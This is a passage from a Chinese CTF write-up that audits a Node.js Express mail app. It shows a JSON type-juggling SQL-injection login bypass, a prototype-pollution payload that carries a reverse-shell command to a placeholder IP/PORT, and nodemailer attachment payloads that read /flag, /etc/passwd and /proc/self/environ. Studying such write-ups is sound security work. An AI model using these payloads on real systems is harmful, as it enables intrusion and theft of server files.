+      shvl<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>contents<span class="token punctuation">,</span> key<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    contents<span class="token punctuation">.</span>from <span class="token operator">=</span> <span class="token string">'"admin" &lt;admin@8-bit.pub&gt;'</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+      <span class="token keyword">await</span> <span class="token function">send</span><span class="token punctuation">(</span>contents<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>message<span class="token operator">:</span> <span class="token string">"Success."</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<p>通过 <code>shvl.set</code> 把接收到的参数赋值给 <code>contents</code>，之后就传进发邮件的了。</p>
+<p>那怎么进入这个发邮件呢？</p>
+<p>根据 <code>routes/index.js</code> 可以看到路由，需要鉴权，就是 <code>admin</code>。</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> adminController <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../controllers/adminController"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> indexController <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../controllers/indexController"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> usersController <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../controllers/usersController"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> auth <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../utils/auth"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> indexController<span class="token punctuation">.</span>home<span class="token punctuation">)</span><span class="token punctuation">;</span>
+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/signin"</span><span class="token punctuation">,</span> usersController<span class="token punctuation">.</span>signinPage<span class="token punctuation">)</span><span class="token punctuation">;</span>
+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/signup"</span><span class="token punctuation">,</span> usersController<span class="token punctuation">.</span>signupPage<span class="token punctuation">)</span><span class="token punctuation">;</span>
+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">,</span> usersController<span class="token punctuation">.</span>logout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span> adminController<span class="token punctuation">.</span>home<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/user/signin"</span><span class="token punctuation">,</span> usersController<span class="token punctuation">.</span>signin<span class="token punctuation">)</span><span class="token punctuation">;</span>
+router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/user/signup"</span><span class="token punctuation">,</span> usersController<span class="token punctuation">.</span>signup<span class="token punctuation">)</span><span class="token punctuation">;</span>
+router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/admin/email"</span><span class="token punctuation">,</span> auth<span class="token punctuation">,</span> adminController<span class="token punctuation">.</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre>
+<p>看 <code>utils/auth.js</code></p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token function-variable function">auth</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">===</span> <span class="token string">"GET"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendView</span><span class="token punctuation">(</span><span class="token string">"forbidden.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> <span class="token string">"Forbidden."</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> auth<span class="token punctuation">;</span></code></pre>
+<p>需要 <code>session.username</code> 为 <code>admin</code>。那首先要登录。</p>
+<p><code>controllers/usersController.js</code></p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../modules/users"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
+  <span class="token function-variable function">signinPage</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendView</span><span class="token punctuation">(</span><span class="token string">"signin.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+
+  <span class="token function-variable function">signupPage</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendView</span><span class="token punctuation">(</span><span class="token string">"signup.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+
+  <span class="token function-variable function">signin</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    user<span class="token punctuation">.</span><span class="token function">signin</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>username<span class="token punctuation">;</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> <span class="token string">"Signin success."</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> <span class="token string">"Username or password wrong."</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+
+  <span class="token function-variable function">signup</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    user<span class="token punctuation">.</span><span class="token function">signup</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> err<span class="token punctuation">.</span>message <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> message<span class="token operator">:</span> <span class="token string">"Signup success."</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+
+  <span class="token function-variable function">logout</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<p>再看 <code>modules/users.js</code></p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> sql <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"../utils/db.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
+  <span class="token function-variable function">signup</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> done</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    sql<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>
+      <span class="token string">"SELECT * FROM users WHERE username = ?"</span><span class="token punctuation">,</span>
+      <span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">,</span>
+      <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"error: "</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          sql<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>
+            <span class="token string">"INSERT INTO users VALUES (?, ?)"</span><span class="token punctuation">,</span>
+            <span class="token punctuation">[</span>username<span class="token punctuation">,</span> password<span class="token punctuation">]</span><span class="token punctuation">,</span>
+            <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+              <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"error: "</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+              <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>insertId<span class="token punctuation">)</span><span class="token punctuation">;</span>
+              <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+          <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            message<span class="token operator">:</span> <span class="token string">"Username already taken."</span>
+          <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+
+  <span class="token function-variable function">signin</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> done</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    sql<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>
+      <span class="token string">"SELECT * FROM users WHERE username = ? AND password = ?"</span><span class="token punctuation">,</span>
+      <span class="token punctuation">[</span>username<span class="token punctuation">,</span> password<span class="token punctuation">]</span><span class="token punctuation">,</span>
+      <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"error: "</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+          <span class="token keyword">return</span> <span class="token function">done</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<p>草，还要 <strong>SQL 注入</strong>……</p>
+<p>于是 <strong>思路就是首先 SQL 注入登录 admin 用户，然后通过发邮件的接口污染原型链读取 flag，或者反弹 shell 之类的。</strong></p>
+<p>但是注意的是，它这里不是手动拼接的 SQL 语句，利用 nodejs 里的 mysql 封装好的函数，通过占位符和参数来进行的，这样会自动转义危险的字符。</p>
+<p><em>于是这里试了挺久都没打通（（</em></p>
+<p>网页上试了试，发现是 urlencode 传参，但是在 <code>app.js</code> 中可以知道 json 也支持的，那就开打。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308015523323.png" alt="json"></p>
+<p>SQL 注入，一般的绕过都不大行，但是<strong>利用 JavaScript 的弱类型和 JSON 的特性</strong>，可以传入一些奇奇怪怪的东西。</p>
+<blockquote>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/niexinming/article/details/84889275">nodejs应用中的权限绕过漏洞—一个赏金漏洞的故事</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6991">一道有趣的关于nodejs的ctf题</a></p>
+</blockquote>
+<p>构造登录 payload，打过去。</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token property">"password"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token property">"password"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre>
+<p>发现确实登录成功了，但是看上去并不是 admin。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308020555039.png"></p>
+<p>可是队友本地搭环境出来确实可行。</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308021608528.png"></p>
+<p><em>不知道是数据库环境的问题还是什么（</em></p>
+<p>后来又试了试，发现 0 1 4 5 等好几个值都能绕过，成功登录，但都不是 admin。</p>
+<p>于是考虑 <code>username</code> 还得是 <code>admin</code>。</p>
+<p>在不断地尝试下，构造</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+<p>生成的 SQL 为</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">AND</span> password <span class="token operator">=</span> <span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token operator">=</span> <span class="token number">1</span></code></pre>
+<p>打过去，终于成了。</p>
+<p>接下来就 <strong>污染原型链</strong>。</p>
+<p>看了看 <a target="_blank" rel="noopener" href="https://github.com/robinvdvleuten/shvl">shvl 项目文档</a>.</p>
+<blockquote>
+<p>🚧 Get and set dot-notated properties within an object.    </p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308022442894.png"></p>
+</blockquote>
+<p>可以通过 <code>.</code> 来索引，<code>shvl.set(obj, 'a.b.c', 2);</code> 这样来给 object 赋值。</p>
+<p>本来先想着反弹 shell，发现不行。</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"Weekend"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"Goodday"</span><span class="token punctuation">,</span> <span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"env"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"AAAA"</span><span class="token operator">:</span><span class="token string">"require(\"child_process\").exec(\"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\")//"</span><span class="token punctuation">,</span> <span class="token property">"NODE_OPTIONS"</span><span class="token operator">:</span><span class="token string">"--require /proc/self/environ"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token comment">//或者</span>
+<span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"Weekend"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"Goodday"</span><span class="token punctuation">,</span> <span class="token property">"__proto__.env.AAAA"</span><span class="token operator">:</span> <span class="token string">"require(\"child_process\").exec(\"bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\")//"</span><span class="token punctuation">,</span> <span class="token property">"__proto__.env.NODE_OPTIONS"</span><span class="token operator">:</span><span class="token string">"--require /proc/self/environ"</span><span class="token punctuation">}</span></code></pre>
+<p><del>后来想到这个貌似需要 fork 进程才能实现，于是不行。</del>（再后来发现又可以了，有 <code>spawn</code></p>
+<p>然后再试了试，发现貌似不能污染原型链……（？？？）</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"Weekend"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"Goodday"</span><span class="token punctuation">,</span> <span class="token property">"__proto__.html"</span><span class="token operator">:</span><span class="token string">"&lt;i&gt;Miao&lt;/i&gt;233333"</span><span class="token punctuation">}</span></code></pre>
+<p>这个打过去收到的邮件里并不是 <code>html</code> 中的内容，说明没有污染到。</p>
+<p>再去看 <code>utils/mail.js</code></p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> nodemailer <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"nodemailer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token parameter">contents</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">let</span> transporter <span class="token operator">=</span> nodemailer<span class="token punctuation">.</span><span class="token function">createTransport</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+  host<span class="token operator">:</span> <span class="token string">"******"</span><span class="token punctuation">,</span> <span class="token comment">// Plz use your own smtp server for testing.</span>
+  port<span class="token operator">:</span> <span class="token number">25</span><span class="token punctuation">,</span>
+  tls<span class="token operator">:</span> <span class="token punctuation">{</span> rejectUnauthorized<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
+  auth<span class="token operator">:</span> <span class="token punctuation">{</span>
+    user<span class="token operator">:</span> <span class="token string">"******"</span><span class="token punctuation">,</span>
+    pass<span class="token operator">:</span> <span class="token string">"******"</span><span class="token punctuation">,</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> transporter<span class="token punctuation">.</span><span class="token function">sendMail</span><span class="token punctuation">(</span>contents<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> send<span class="token punctuation">;</span></code></pre>
+<p>调用了 nodemailer 进行发送。</p>
+<p>查看其文档 <a target="_blank" rel="noopener" href="https://nodemailer.com/message/">Message configuration</a>，发现有个 <a target="_blank" rel="noopener" href="https://nodemailer.com/message/attachments/">Attachments</a>，可以发附件，那就试试能否把 flag 带出来。</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token property">"attachments"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"/readflag"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>
+<span class="token punctuation">{</span><span class="token property">"to"</span><span class="token operator">:</span><span class="token string">"xxx"</span><span class="token punctuation">,</span><span class="token property">"subject"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token property">"text"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token property">"attachments"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"/flag"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308020250285.png"></p>
+<p>失败了，没有权限执行。</p>
+<p>然后读了点其他东西，试了下当前目录在 <code>/var/www/web</code></p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308023821295.png" alt="/etc/passwd"></p>
+<p><code>/proc/self/environ</code> 环境变量</p>
+<p><img src="/2021/03/09/CTF_2021Ant-D3CTF/image-20210308023927259.png" alt="/proc/self/environ"></p>
+<p>以及 数据库/session/mail 的一些信息，但是也没啥用啊。</p>
+<p><del>难不成 SMTP 去窃取别人的附件</del>（没试过不知道行不行 233</p>
+<p>这时候再回过来看 <a target="_blank" rel="noopener" href="https://github.com/robinvdvleuten/shvl/blob/master/index.js">shvl 源码</a></p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">set</span>  <span class="token punctuation">(</span><span class="token parameter">object<span class="token punctuation">,</span> path<span class="token punctuation">,</span> val<span class="token punctuation">,</span> obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
